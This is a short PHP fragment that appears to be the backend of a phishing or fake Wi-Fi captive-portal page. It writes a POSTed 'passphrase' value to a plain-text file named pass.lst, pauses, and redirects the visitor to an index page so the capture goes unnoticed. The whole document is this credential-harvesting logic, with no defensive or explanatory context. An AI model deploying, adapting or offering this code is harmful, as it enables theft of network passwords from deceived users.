<!-- create pass.lst -->
<?php
 $file = fopen('pass.lst', 'w+');
 fwrite($file,$_POST['passphrase']);
 fclose($file);
 sleep(1.5);
?>

<!-- redirect -->
<?php
 header('location: ../index.html')
?>
